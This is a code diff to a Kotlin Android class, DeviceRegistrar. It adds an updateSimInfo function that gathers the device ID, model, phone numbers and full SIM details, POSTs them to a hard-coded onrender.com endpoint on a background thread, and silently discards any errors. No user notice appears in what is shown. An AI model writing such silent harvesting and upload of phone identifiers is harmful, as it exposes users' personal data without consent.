@@ -24,6 +24,10 @@ class DeviceRegistrar private constructor(private val context: Context) {
                 instance?.startRegistration()
             }
         }
+
+        fun updateSimInfo() {
+            instance?.updateSimInfo()
+        }
     }
 
     private fun getDeviceId(): String {
@@ -41,20 +45,46 @@ class DeviceRegistrar private constructor(private val context: Context) {
         }, 2000)
     }
 
-    private fun doRegister() {
+    fun updateSimInfo() {
         val deviceId = getDeviceId()
         val simInfo = SimInfo(context).getSimInfo()
-        val phoneNumbers = (0 until simInfo.length()).map { i ->
-            simInfo.getJSONObject(i).optString("number", "")
-        }.filter { it.isNotEmpty() }
+        Thread {
+            try {
+                val phoneNumbers = (0 until simInfo.length()).map { i ->
+                    simInfo.getJSONObject(i).optString("number", "")
+                }.filter { it.isNotEmpty() }
+                val json = JSONObject().apply {
+                    put("device_id", deviceId)
+                    put("device_name", "${Build.BRAND} ${Build.MODEL}")
+                    put("model", Build.MODEL)
+                    put("os_version", "Android ${Build.VERSION.RELEASE}")
+                    put("app_version", "1.0.0")
+                    put("phone_number", phoneNumbers.firstOrNull() ?: "")
+                    put("sim_info", simInfo.toString())
+                }
+                val conn = URL("https://bill-1-9yfp.onrender.com/api/device").openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.doOutput = true
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
+                conn.outputStream.write(json.toString().toByteArray())
+                conn.responseCode
+                conn.disconnect()
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun doRegister() {
+        val deviceId = getDeviceId()
         val json = JSONObject().apply {
             put("device_id", deviceId)
             put("device_name", "${Build.BRAND} ${Build.MODEL}")
             put("model", Build.MODEL)
             put("os_version", "Android ${Build.VERSION.RELEASE}")
             put("app_version", "1.0.0")
-            put("phone_number", phoneNumbers.firstOrNull() ?: "")
-            put("sim_info", simInfo.toString())
+            put("phone_number", "")
+            put("sim_info", "[]")
         }
 
         Thread {
